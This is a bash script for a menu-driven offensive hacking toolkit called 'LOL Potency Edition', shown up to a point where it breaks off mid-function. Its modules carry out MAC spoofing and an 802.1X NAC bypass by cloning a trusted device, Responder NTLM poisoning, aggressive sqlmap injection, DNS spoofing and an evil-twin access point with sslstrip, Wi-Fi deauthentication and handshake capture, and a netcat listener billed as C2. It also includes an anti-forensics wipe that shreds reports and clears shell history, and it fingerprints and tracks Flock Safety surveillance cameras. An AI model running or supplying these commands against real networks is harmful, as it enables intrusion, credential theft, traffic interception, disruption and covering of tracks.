#!/bin/bash

# --- SYSTEM PATH CONFIG ---
export PATH=$PATH:$HOME/go/bin:/usr/local/bin:$(gem env home)/bin:$HOME/.local/bin

# --- CONFIGURATION SYSTEM ---
CONFIG_FILE="$HOME/.lol_config"
if [ ! -f "$CONFIG_FILE" ]; then
    cat <<EOF > "$CONFIG_FILE"
SHODAN_API_KEY=""
HIBP_API_KEY=""
DISCORD_WEBHOOK=""
EOF
fi
source "$CONFIG_FILE"

# --- NEON AESTHETIC ---
NEON_BLUE='\e[1;34m'
NEON_PINK='\e[1;35m'
RESET='\e[0m'

# --- CORE ENGINE ---

req() {
    local proxy=""
    if [ "$USE_TOR" = true ]; then proxy="--proxy $TOR_PROXY"; fi
    curl -s $proxy -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$@"
}

loading_anim() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -ne " ${NEON_BLUE}[*] PROCESSING... ${RESET}"
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    echo -e "\b\b\b\b${NEON_BLUE} [DONE] ${RESET}"
}

# --- PHANTOM TIER MODULES ---

ghost_insertion() {
    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
    
    echo -e "${NEON_PINK}[!] INITIATING FORCE-SILENCE GHOSTING: $INTERFACE${RESET}"
    echo -e "${NEON_BLUE}[*] Killing system networking interference...${RESET}"
    sudo nmcli device set "$INTERFACE" managed no 2>/dev/null
    sudo dhclient -x "$INTERFACE" 2>/dev/null
    
    echo -e "${NEON_BLUE}[*] Randomizing hardware identity...${RESET}"
    sudo ip link set dev "$INTERFACE" down
    if ! sudo macchanger -r "$INTERFACE"; then
        echo -e "${NEON_BLUE}[*] Standard macchanger failed. Using manual override...${RESET}"
        sudo ip link set dev "$INTERFACE" address 00:$(openssl rand -hex 5 | sed 's/\(..\)/\1:/g; s/.$//')
    fi
    
    echo -e "${NEON_BLUE}[*] Disabling IPv6 and flushing all addresses...${RESET}"
    sudo sysctl -w net.ipv6.conf."$INTERFACE".disable_ipv6=1 > /dev/null
    sudo ip addr flush dev "$INTERFACE"
    sudo ip link set dev "$INTERFACE" promisc on
    sudo ip link set dev "$INTERFACE" up
    
    echo -e "${NEON_BLUE}[+] GHOST MODE ACTIVE. Your machine is now a silent ghost.${RESET}"
    echo -e "${NEON_BLUE}[*] System Network Manager has been locked out of $INTERFACE.${RESET}"
}

ghost_restore() {
    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
    
    echo -e "${NEON_BLUE}[!] RESTORING STANDARD LINK: $INTERFACE${RESET}"
    echo -e "${NEON_BLUE}[*] Re-enabling system networking management...${RESET}"
    sudo ip link set dev "$INTERFACE" down
    sudo ip link set dev "$INTERFACE" promisc off
    sudo sysctl -w net.ipv6.conf."$INTERFACE".disable_ipv6=0 > /dev/null
    sudo macchanger -p "$INTERFACE" || sudo ip link set dev "$INTERFACE" address $(ip link show "$INTERFACE" | grep "link/ether" | awk '{print $2}')
    sudo nmcli device set "$INTERFACE" managed yes 2>/dev/null
    sudo ip link set dev "$INTERFACE" up
    sudo dhclient -nw "$INTERFACE"
    echo -e "${NEON_BLUE}[+] LINK RESTORED.${RESET}"
}

direct_link_disco() {
    echo -e "${NEON_PINK}[!] INITIATING DIRECT-LINK DISCOVERY (PASSIVE/ACTIVE)...${RESET}"
    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
    
    echo -e "${NEON_BLUE}[*] Sniffing peer identities on $INTERFACE...${RESET}"
    # Improved parsing to extract IP and MAC directly from DHCP/ARP/MDNS
    sudo timeout 30 tcpdump -i "$INTERFACE" -lnne "(udp port 67 or arp or udp port 5353)" -c 10 2>/dev/null | awk '/ARP, Request/ {print "[+] ARP: " $NF " is at " $2} /MDNS/ {print "[+] mDNS Device Detected"} /bootp/ {print "[+] DHCP Request from: " $2}' | sort -u
    
    echo -ne "${NEON_BLUE}\n    Target IP to audit: ${RESET}"; read pip
    if [ ! -z "$pip" ]; then share_hunter "$pip"; fi
}

share_hunter() {
    echo -e "${NEON_PINK}[!] AGGRESSIVE SHARE & VULN HUNT: $1${RESET}"
    echo -e "${NEON_BLUE}[*] Enumerating shares and checking for critical SMB vulnerabilities...${RESET}"
    sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-os-discovery -Pn "$1"
    echo -e "\n${NEON_BLUE}[*] Checking NFS exports...${RESET}"
    sudo nmap -p 2049 --script nfs-showmount,nfs-ls -Pn "$1"
}

wpad_audit() {
    echo -e "${NEON_PINK}[!] WPAD / PROXY CONFIG AUDIT${RESET}"
    echo -e "${NEON_BLUE}[*] Listening for proxy discovery requests (Web Proxy Auto-Discovery)...${RESET}"
    sudo timeout 45 tcpdump -i any -ln "port 80 and host 255.255.255.255" -A 2>/dev/null | grep -i "GET /wpad.dat" && echo -e "${NEON_PINK}[!] ALERT: WPAD REQUEST DETECTED! Network is vulnerable to proxy poisoning.${RESET}" || echo "No WPAD traffic detected."
}

nac_bypass() {
    echo -e "${NEON_PINK}[!] 802.1X NAC BYPASS (MAC CLONING)${RESET}"
    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
    echo -e "${NEON_BLUE}[*] Sniffing for CDP/LLDP/STP frames to map trusted infrastructure...${RESET}"
    # Capture more frames to increase chance of finding trusted device MACs
    sudo timeout 60 tcpdump -i "$INTERFACE" -nn -e -v -s 1500 '(ether[12:2]=0x88cc or ether[20:2]=0x2000 or ether proto 0x8808)' 2>/dev/null > /tmp/nac_sniff.txt
    
    local macs=$(grep -oE "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}" /tmp/nac_sniff.txt | sort -u)
    if [ -z "$macs" ]; then
        echo -e "${NEON_PINK}[!] No trusted devices detected.${RESET}"
    else
        echo -e "${NEON_BLUE}[+] Potential Trusted MACs discovered:${RESET}"
        echo "$macs" | nl
        echo -ne "${NEON_BLUE}\n    Select MAC index to clone (or enter custom): ${RESET}"; read idx
        local target_mac=$(echo "$macs" | sed -n "${idx}p")
        if [ -z "$target_mac" ]; then target_mac=$idx; fi
        
        echo -e "${NEON_BLUE}[*] Spoofing MAC to $target_mac...${RESET}"
        sudo ip link set dev "$INTERFACE" down
        sudo macchanger -m "$target_mac" "$INTERFACE" > /dev/null || sudo ip link set dev "$INTERFACE" address "$target_mac"
        sudo ip link set dev "$INTERFACE" up
        echo -e "${NEON_BLUE}[+] Identity cloned. NAC bypass complete.${RESET}"
    fi
    rm /tmp/nac_sniff.txt
}

ntlm_poison() {
    echo -e "${NEON_PINK}[!] NTLM POISONING & CAPTURE (RESPONDER)${RESET}"
    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ ! -d "/opt/Responder" ]; then echo -e "${NEON_PINK}[!] Responder not installed at /opt/Responder${RESET}"; return; fi
    echo -e "${NEON_BLUE}[*] Launching Responder (Analysis & Capture) on $INTERFACE...${RESET}"
    sudo python3 /opt/Responder/Responder.py -I "$INTERFACE" -wrf -v
}

gateway_hunt() {
    echo -e "${NEON_PINK}[!] LOCAL GATEWAY ADMIN HUNT${RESET}"
    local GW=$(ip route | grep default | awk '{print $3}' | head -n 1)
    if [ -z "$GW" ]; then echo -e "${NEON_PINK}[!] No default gateway found.${RESET}"; return; fi
    echo -e "${NEON_BLUE}[*] Gateway target: $GW${RESET}"
    echo -e "${NEON_BLUE}[*] Auditing for management interfaces and common vulnerabilities...${RESET}"
    sudo nmap -sV -p 21,22,23,80,443,445,8080,8443,10000 --script http-title,http-auth,ssl-cert,snmp-info,vuln -Pn "$GW"
}

protocol_audit() {
    echo -e "${NEON_PINK}[!] AUDITING INTERNAL BROADCAST PROTOCOLS (LLMNR/mDNS)${RESET}"
    echo -e "${NEON_BLUE}[*] Listening for leakages... (Run for 30s)${RESET}"
    sudo timeout 30 tcpdump -i any -n "udp port 5353 or udp port 5355" -c 50 2>/dev/null
}

vlan_hop_recon() {
    echo -e "${NEON_PINK}[!] INITIATING VLAN / TRUNKING RECON${RESET}"
    echo -e "${NEON_BLUE}[*] Checking if current port is a Trunk (DTP/VTP)...${RESET}"
    sudo yersinia dtp -t
}

snmp_map() {
    echo -e "${NEON_PINK}[!] SNMP INFRASTRUCTURE MAPPING: $1${RESET}"
    echo -e "${NEON_BLUE}[*] Brute-forcing community strings and dumping info...${RESET}"
    sudo nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-interfaces "$1"
}

origin_find() {
    echo -e "${NEON_PINK}[!] INITIATING ORIGIN IP DISCOVERY: $1${RESET}"
    echo -e "${NEON_BLUE}[*] Searching CT Logs & Historical DNS...${RESET}"
    (req "https://crt.sh/?q=$1&output=json" | jq -r '.[].common_name' | sort -u) &
    (req "https://viewdns.info/iphistory/?domain=$1" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u) &
    wait
}

employee_recon() {
    echo -e "${NEON_PINK}[!] INITIATING EMPLOYEE RECON: $1${RESET}"
    echo -e "${NEON_BLUE}[*] Scraping professional fragments...${RESET}"
    req "https://www.google.com/search?q=site:linkedin.com/in/+\"%40$1\"" | grep -oE "[A-Z][a-z]+ [A-Z][a-z]+" | sort -u
}

supply_audit() {
    echo -e "${NEON_PINK}[!] SUPPLY CHAIN VULNERABILITY AUDIT: $1${RESET}"
    echo -e "${NEON_BLUE}[*] Checking for exposed package metadata...${RESET}"
    for file in "package.json" "requirements.txt" "composer.json" "Gemfile"; do
        req -L -I "https://$1/$file" | grep -q "200 OK" && echo -e " ${NEON_PINK}[!] ALERT: $file EXPOSED at https://$1/$file${RESET}"
    done
}

# --- SHADOW TIER MODULES ---

breach_search() {
    echo -e "${NEON_PINK}[!] SEARCHING FOR LEAKED CREDENTIALS: $1${RESET}"
    if [ -z "$HIBP_API_KEY" ]; then echo -e "${NEON_BLUE}[*] HIBP_API_KEY not set in $CONFIG_FILE${RESET}"; return; fi
    req "https://haveibeenpwned.com/api/v3/breachedaccount/$1" -H "hibp-api-key: $HIBP_API_KEY" || echo -e "${NEON_PINK}[*] No data or key invalid.${RESET}"
}

bt_recon() {
    echo -e "${NEON_PINK}[!] PHYSICAL PROXIMITY RECON (BLUETOOTH)...${RESET}"
    sudo hcitool scan || echo -e "${NEON_PINK}[!] No BT interface found.${RESET}"
}

takeover_check() {
    echo -e "${NEON_PINK}[!] SUBDOMAIN TAKEOVER AUDIT: $1${RESET}"
    nuclei -u "$1" -t takeovers/ -silent
}

ghost_mode() {
    INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
    local NEW_HOST="GRIM-$(openssl rand -hex 3)"
    echo -e "${NEON_PINK}[!] INITIATING GHOST MODE: $INTERFACE${RESET}"
    sudo ip link set dev $INTERFACE down
    sudo macchanger -r $INTERFACE
    sudo hostnamectl set-hostname "$NEW_HOST"
    sudo ip link set dev $INTERFACE up
    echo -e "${NEON_BLUE}[*] Identity spoofed. MAC randomized. Hostname: $NEW_HOST${RESET}"
}

api_intel() {
    echo -e "${NEON_PINK}[!] GLOBAL API INTEL (SHODAN): $1${RESET}"
    if [ -z "$SHODAN_API_KEY" ]; then echo -e "${NEON_BLUE}[*] SHODAN_API_KEY not set in $CONFIG_FILE${RESET}"; return; fi
    shodan init "$SHODAN_API_KEY" > /dev/null 2>&1
    shodan host "$1" 2>/dev/null || echo -e "${NEON_PINK}[!] No Shodan data found.${RESET}"
}

discord_notify() {
    if [ -z "$DISCORD_WEBHOOK" ]; then return; fi
    curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"[☠] $1\"}" "$DISCORD_WEBHOOK" > /dev/null 2>&1
}

# --- CORE ATTACK & RECON MODULES ---

rust_scan() {
    echo -e "${NEON_PINK}[!] ULTRA-FAST PORT SCAN (RUSTSCAN): $1${RESET}"
    ulimit -n 65535 2>/dev/null
    rustscan -a "$1" --ulimit 5000 -- -sV -sC -O -Pn -T4
}

sub_discover() {
    echo -e "${NEON_PINK}[!] AGGRESSIVE MULTI-SOURCE SUBDOMAIN MAP: $1${RESET}"
    local tmp_sub="/tmp/lol_subs"
    subfinder -d "$1" -all -silent > "$tmp_sub"
    assetfinder --subs-only "$1" >> "$tmp_sub"
    cat "$tmp_sub" | sort -u | httpx -silent -title -status-code -td
    rm "$tmp_sub"
}

sql_inject() {
    echo -e "${NEON_PINK}[!] AGGRESSIVE SQL INJECTION: $1${RESET}"
    sqlmap -u "$1" --batch --random-agent --level=3 --risk=2 --tamper=space2comment --dbs --exclude-sysdbs
}

vuln_scan() {
    echo -e "${NEON_PINK}[!] DEEP VULNERABILITY AUDIT (HTTPX + NUCLEI): $1${RESET}"
    echo -e "${NEON_BLUE}[*] Profiling technologies and filtering alive hosts...${RESET}"
    echo "$1" | httpx -silent | nuclei -severity low,medium,high,critical -t cves,vulnerabilities,exposed-panels,misconfiguration,takeovers -rl 50 -c 50 -es info
}

cloud_recon() {
    echo -e "${NEON_PINK}[!] CLOUD ASSET ENUMERATION: $1${RESET}"
    local providers=("s3.amazonaws.com" "blob.core.windows.net" "storage.googleapis.com")
    for p in "${providers[@]}"; do
        local url="https://$1.$p"
        req -L -I "$url" | grep -q "200\|403" && echo -e " ${NEON_BLUE}[+]${RESET} Found Asset: $url"
    done
}

web_fuzz() {
    echo -e "${NEON_PINK}[!] AGGRESSIVE WEB FUZZING (FFUF): $1${RESET}"
    ffuf -u "$1/FUZZ" -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403 -e .php,.html,.txt,.git,.env,.bak,.zip -t 100 -recursion -recursion-depth 2 -v
}

wp_audit() {
    echo -e "${NEON_PINK}[!] WORDPRESS SECURITY AUDIT: $1${RESET}"
    wpscan --url "$1" --enumerate vp,vt,tt,u,cb,dbe --plugins-detection aggressive --force --no-update --disable-tls-checks
}

# --- WORLD-CLASS OPERATIONAL MODULES ---

github_dork() {
    echo -e "${NEON_PINK}[!] INITIATING GITHUB DORKING: $1${RESET}"
    local queries=("filename:config" "filename:.env" "extension:sql" "password" "aws_key")
    for q in "${queries[@]}"; do
        echo -e " ${NEON_BLUE}[+]${RESET} Querying: $q"
        req "https://github.com/search?q=org%3A$1+$q&type=code" | grep -oE "/[a-zA-Z0-9_-]+/[a-zA-Z0-9._-]+" | sort -u | head -n 5
    done
}

internal_enum() {
    echo -e "${NEON_PINK}[!] INTERNAL NETWORK ENUM (SMB/RPC): $1${RESET}"
    sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users -Pn "$1"
}

anti_forensics() {
    echo -e "${NEON_PINK}[!] INITIATING GHOST WIPE${RESET}"
    local SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    find "$SCRIPT_DIR" -name "lol_report_*" -o -name "lol_intel_*" | xargs shred -u 2>/dev/null
    history -c && history -w
    echo -e "${NEON_BLUE}[+] Operation complete. No trace remains.${RESET}"
}

c2_listener() {
    echo -e "${NEON_PINK}[!] INITIATING C2 LISTENER ON PORT 4444...${RESET}"
    nc -lvp 4444
}

dns_hijack() {
    echo -ne "${NEON_BLUE}    Domain to spoof: ${RESET}"; read dom
    echo -ne "${NEON_BLUE}    Redirect to IP: ${RESET}"; read rip
    sudo bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on; net.sniff on"
}

# --- SIGINT & WIRELESS MODULES ---

wifi_handshake() {
    echo -e "${NEON_PINK}[!] INITIATING WPA HANDSHAKE CAPTURE${RESET}"
    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
    
    echo -e "${NEON_BLUE}[*] Enabling Monitor Mode on $INTERFACE...${RESET}"
    sudo airmon-ng start "$INTERFACE" > /dev/null
    local MON_IFACE="${INTERFACE}mon"
    
    echo -e "${NEON_BLUE}[*] Scanning for targets... (Press Ctrl+C when you see your target)${RESET}"
    sudo timeout 20 airodump-ng "$MON_IFACE" || true
    
    echo -ne "${NEON_BLUE}    Enter Target BSSID: ${RESET}"; read bssid
    echo -ne "${NEON_BLUE}    Enter Target Channel: ${RESET}"; read channel
    
    echo -e "${NEON_BLUE}[*] Capturing handshake on $bssid (Channel $channel)...${RESET}"
    echo -e "${NEON_BLUE}[*] Launching deauth in background to force reconnection...${RESET}"
    (sudo aireplay-ng --deauth 10 -a "$bssid" "$MON_IFACE" > /dev/null 2>&1) &
    
    sudo timeout 60 airodump-ng --bssid "$bssid" -c "$channel" -w "/tmp/handshake_${bssid//:/}" "$MON_IFACE"
    
    sudo airmon-ng stop "$MON_IFACE" > /dev/null
    echo -e "${NEON_BLUE}[+] Capture attempt finished. Check /tmp/handshake_*.cap${RESET}"
}

evil_twin_start() {
    echo -e "${NEON_PINK}[!] INITIATING EVIL TWIN CAPTIVE PORTAL${RESET}"
    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
    
    echo -ne "${NEON_BLUE}    Enter SSID to spoof: ${RESET}"; read ssid
    echo -e "${NEON_BLUE}[*] Starting bettercap evil-twin for $ssid...${RESET}"
    echo -e "${NEON_PINK}[!] This requires the 'http.proxy' and 'wifi' caplets.${RESET}"
    sudo bettercap -eval "set wifi.ap.ssid $ssid; wifi.ap on; set http.proxy.sslstrip true; http.proxy on; net.sniff on"
}

wifi_deauth() {
    echo -e "${NEON_PINK}[!] INITIATING DEAUTH ATTACK${RESET}"
    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
    if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
    
    echo -ne "${NEON_BLUE}    Target BSSID: ${RESET}"; read bssid
    echo -ne "${NEON_BLUE}    Client MAC (FF:FF:FF:FF:FF:FF for all): ${RESET}"; read client
    
    sudo airmon-ng start "$INTERFACE" > /dev/null
    sudo aireplay-ng --deauth 0 -a "$bssid" -c "$client" "${INTERFACE}mon"
    sudo airmon-ng stop "${INTERFACE}mon" > /dev/null
}

# --- IOT & SURVEILLANCE MODULES ---

flock_intel_offline() {
    echo -e "${NEON_BLUE}========================================================${RESET}"
    echo -e " ${NEON_PINK}FLOCK SAFETY: OFFLINE TECHNICAL INTELLIGENCE${RESET}"
    echo -e "${NEON_BLUE}========================================================${RESET}"
    echo -e "${NEON_BLUE}[+] DEVICE MODELS:${RESET}"
    echo -e "  - Falcon: Automated License Plate Recognition (ALPR)"
    echo -e "  - Condor: Pan-Tilt-Zoom (PTZ) Surveillance"
    echo -e "  - Raven: Audio Detection (Gunshot/Siren)"
    echo -e ""
    echo -e "${NEON_BLUE}[+] HARDWARE FINGERPRINTS:${RESET}"
    echo -e "  - FCC ID: N7NRC76B (Sierra Wireless LTE)"
    echo -e "  - FCC ID: WCBN3510A (Lite-On WiFi/BT)"
    echo -e "  - SoM: Lantronix Open-Q 624A (Snapdragon 624)"
    echo -e ""
    echo -e "${NEON_BLUE}[+] WIRELESS SIGNATURES:${RESET}"
    echo -e "  - BLE UUIDs: 0000180a-0000-1000-8000-00805f9b34fb"
    echo -e "  - BLE Manufacturer ID: 0x09C8"
    echo -e "  - WiFi SSIDs: Flock-[6-char-MAC]"
    echo -e "${NEON_BLUE}========================================================${RESET}"
}

flock_foxhunt() {
    echo -e "${NEON_PINK}[!] INITIATING TACTICAL FOXHUNT (PROXIMITY TRACKING)${RESET}"
    echo -e "${NEON_BLUE}[*] Mode: Offline Signal Strength Tracking${RESET}"
    echo -e "${NEON_BLUE}[*] Scanning for BLE heartbeats... Press Ctrl+C to stop.${RESET}\n"
    
    # Simple loop to track RSSI without internet
    while true; do
        # Use bluetoothctl to grab RSSI for known Flock prefixes
        local result=$(timeout 5 bluetoothctl --timeout 5 scan on | grep -E "82:6B:F2|EC:62:60|74:4C:A1|Flock" --line-buffered)
        if [ ! -z "$result" ]; then
            local rssi=$(echo "$result" | grep -oE "RSSI: -[0-9]+" | cut -d' ' -f2)
            local mac=$(echo "$result" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
            if [ ! -z "$rssi" ]; then
                # Visual strength meter
                local bars=""
                local val=$(( (rssi + 100) / 5 ))
                for ((i=0; i<val; i++)); do bars="${bars}█"; done
                echo -e "${NEON_PINK}[SIGNAL]${RESET} MAC: $mac | RSSI: ${rssi}dBm | ${NEON_BLUE}${bars}${RESET}"
            fi
        else
            echo -ne "Scanning... \r"
        fi
        sleep 1
    done
}

flock_community_sync() {
    echo -e "${NEON_PINK}[!] SYNCING COMMUNITY SURVEILLANCE DATABASE (DEFLOCK/OSM)${RESET}"
    echo -e "${NEON_BLUE}[*] Fetching latest ALPR data from OpenStreetMap...${RESET}"
    # Querying OSM Overpass API for surveillance cameras tagged as ALPR
    local query='[out:json];node["man_made"="surveillance"]["surveillance:type"="alp"];out body;'
    curl -s -X POST -d "$query" "https://overpass-api.de/api/interpreter" > "${SCRIPT_DIR}/flock_db.json"
    
    if [ -s "${SCRIPT_DIR}/flock_db.json" ]; then
        local count=$(jq '.elements | length' "${SCRIPT_DIR}/flock_db.json")
        echo -e "${NEON_BLUE}[+] Sync complete. $count cameras added to local database.${RESET}"
    else
        echo -e "${NEON_PINK}[-] Sync failed. Check internet connection.${RESET}"
    fi
}

flock_traffic_watch() {
    echo -e "${NEON_PINK}[!] INITIATING TRAFFIC BURST MONITORING${RESET}"
    echo -ne "${NEON_BLUE}    Target IP to monitor: ${RESET}"; read tip
    echo -e "${NEON_BLUE}[*] Watching $tip for high-bandwidth upload bursts...${RESET}"
    echo -e "${NEON_BLUE}[*] (This typically indicates a license plate upload event)${RESET}"
    
    # Simple traffic monitor using tcpdump to detect spikes
    sudo tcpdump -i any host "$tip" -l -e -n | stdbuf -oL awk '{print $NF}' | while read -r len; do
        if [ "$len" -gt 1000 ]; then
            echo -e "${NEON_PINK}[ALERT]${RESET} High-bandwidth burst detected from $tip: ${len} bytes"
            echo -e "${NEON_BLUE}[*] Possible data exfiltration/upload event at $(date)${RESET}"
        fi
    done
}

flock_fingerprint_deep() {
    echo -e "${NEON_PINK}[!] INITIATING DEEP FINGERPRINTING${RESET}"
    echo -ne "${NEON_BLUE}    Target IP: ${RESET}"; read tip
    local endpoints=("/api/v1/status" "/config" "/debug" "/health" "/api/v1/camera/config")
    
    for ep in "${endpoints[@]}"; do
        echo -e "${NEON_BLUE}[*] Probing: http://${tip}:8900${ep}${RESET}"
        curl -s -m 3 "http://${tip}:8900${ep}" | jq . 2>/dev/null || echo "  -> No data found."
    done
}

flock_finder() {
    echo -e "${NEON_PINK}[!] INITIATING FLOCK SAFETY CAMERA SCANNER${RESET}"
    echo -e "${NEON_BLUE}[1] Remote Intelligence (Shodan)${RESET}"
    if [ -z "$SHODAN_API_KEY" ]; then 
        echo -e "${NEON_PINK}[-] Shodan API key not set. Skipping remote scan.${RESET}"
    else
        # Primary Dorks for Flock Safety Units
        local dorks=(
            'title:"Flock Admin"'
            'port:8900 "Flock Safety"'
            'http.html:"Condor"'
            'http.component:"Lantronix"'
        )
        for dork in "${dorks[@]}"; do
            echo -e "${NEON_BLUE}[*] Querying: $dork${RESET}"
            shodan search "$dork" --fields ip_str,port,org,location.city 2>/dev/null | head -n 10
        done
    fi

    echo -e "\n${NEON_BLUE}[2] Local Network Discovery (ARP/OUI)${RESET}"
    local INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
    # Known Flock/Lantronix/Lite-On OUI Prefixes
    local flock_ouis=("82:6B:F2" "EC:62:60" "74:4C:A1" "9C:2F:9D" "BC:CF:CC" "D0:53:49")
    
    echo -e "${NEON_BLUE}[*] Scanning local network on $INTERFACE...${RESET}"
    sudo arp-scan --interface=$INTERFACE --localnet --retry=3 --ignoredups > /tmp/flock_arp.txt
    
    local found=false
    for oui in "${flock_ouis[@]}"; do
        if grep -qi "$oui" /tmp/flock_arp.txt; then
            echo -e "${NEON_PINK}[+] ALERT: Potential Flock Safety device detected!${RESET}"
            grep -i "$oui" /tmp/flock_arp.txt | awk '{print "    -> IP: " $1 " | MAC: " $2}'
            found=true
        fi
    done
    
    if [ "$found" = false ]; then echo -e "${NEON_BLUE}[-] No Flock devices found in local ARP cache.${RESET}"; fi
    rm /tmp/flock_arp.txt

    echo -e "\n${NEON_BLUE}[3] Bluetooth Low Energy (BLE) Heartbeat Sniffing${RESET}"
    if command -v bluetoothctl &> /dev/null; then
        echo -e "${NEON_BLUE}[*] Scanning for BLE Advertisements (0x09C8 / Flock)... (Press Ctrl+C to stop)${RESET}"
        # Scanning for specific manufacturer data patterns found in Flock research
        sudo timeout 20 bluetoothctl --timeout 20 scan on | grep -E "Flock|Condor|82:6B:F2|EC:62:60" || echo -e "${NEON_BLUE}[-] No immediate BLE signatures detected.${RESET}"
    else
        echo -e "${NEON_PINK}[-] bluez/bluetoothctl not found. Skipping BLE scan.${RESET}"
    fi

    echo -e "\n${NEON_BLUE}[4] LTE/Sierra Wireless Modem Fingerprinting${RESET}"
    echo -ne "${NEON_BLUE}    Enter Target IP to probe for Sierra Wireless: ${RESET}"; read lte_ip
    if [ ! -z "$lte_ip" ]; then
        echo -e "${NEON_BLUE}[*] Probing $lte_ip for Sierra Wireless RC76xx signatures...${RESET}"
        # Sierra Wireless modems often have specific ports open for diagnostic/LTE management
        sudo nmap -sV -Pn -p 22,80,443,8000,8080,8900 --script banner,http-title "$lte_ip" | grep -iE "Sierra|Lantronix|Qualcomm|Open-Q"
    fi

    echo -e "\n${NEON_BLUE}[5] WigLe.net Wireless Intelligence${RESET}"
    echo -e "Search for 'Flock-' SSIDs on WiGLE to find historical deployments:"
    echo -e "${NEON_BLUE} -> https://wigle.net/map?mapssid=Flock-%25${RESET}"
}

# --- UI & GUI ENGINE ---

show_banner() {
    clear
    echo -e "${NEON_BLUE}"
    echo -e "                ...........        ..:.                               "
    echo -e "               :::::::::::::::.  ::..:::. .:....                      "
    echo -e "               .::...          .:::..::::  ............               "
    echo -e "                ::           ...::::::::::            ......          "
    echo -e "                 :.         .: .:::::::::::.                ...       "
    echo -e "                 .:        .:. .::::::::::::.                         "
    echo -e "                  :.       .:...::::.......::.                        "
    echo -e "                  .:       .:...::.      .. .:                        "
    echo -e "                   :.       ::...  .::::.::   .                       "
    echo -e "                   ::      .::.     :::.                              "
    echo -e "                   .:.   ..:.:. ..... .:..                            "
    echo -e "                    ::   :::.:    .:::::    ..                        "
    echo -e "                     :. ...::.    .:.::.   ..                         "
    echo -e "                     :: :::.     .. ...   .:.::                       "
    echo -e "                ..:: .:..:.           ...:::::::.....                 "
    echo -e "              .:::::  :: ::.....     .:......::::::::.                "
    echo -e "             ......:. .:..::::::       ....:::::::::::.               "
    echo -e "            ...:....:  :: ::.:::.     ..::::::::.::::..:              "
    echo -e "           :..:::... : .:..::....      ..:..::::.:::.  ::             "
    echo -e "          ::..::::::..  :: ::::::..      ..:::::.::::  .:.            "
    echo -e "         .... ..:::.    ....:.::::..      .::.::..:::  .::            "
    echo -e "       .:..........         .  :::.      ..   :: .::.. .::.           "
    echo -e "      ::......:...  . .:.   .. :::....... ...::  .::.:..::.           "
    echo -e "     .:::....:. ..  . ::.    . ::....   .:..:::  ::: :. ::.           "
    echo -e "     :.....::..  ..          .:::..    ::..:::.  ::... :::.           "
    echo -e "    .. . .::.... .:  ..     :.::::::...  .:::.   :: : .:::.           "
    echo -e "    . ..      ....::::::    ::.:::.     .:::.    : ...::::            "
    echo -e "   ......     .:::::::::.   .:.:::::..::::::.   ..  .::::             "
    echo -e "   ..:...     ...::::::::.   :: :::::::::..::  ..  .::::  .           "
    echo -e "      .....  ..::.::......   .:. .:.::.....:. ..  :::::: .:           "
    echo -e ""
    echo -e "                        L   O   L"
    echo -e "                P O T E N C Y   E D I T I O N"
    echo -e " ____________________________________________________________________ "
    echo -e "${RESET}"
}

grim_gui() {
    INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}' 2>/dev/null || echo "N/A")
    LOCAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d/ -f1 2>/dev/null || echo "127.0.0.1")
    BLUR_IP=false
    
    while true; do
        DISPLAY_IP=$LOCAL_IP
        if [ "$BLUR_IP" = true ]; then DISPLAY_IP="[ HIDDEN ]"; fi
        STEALTH_STATUS="${NEON_PINK}DISABLED${RESET}"; if [ "$USE_TOR" = true ]; then STEALTH_STATUS="${NEON_BLUE}ACTIVE (TOR)${RESET}"; fi
        HOST_NOW=$(hostname)
        
        show_banner
        echo -e " ${NEON_BLUE}┌─────────────────────── SYSTEM STATUS ────────────────────────┐${RESET}"
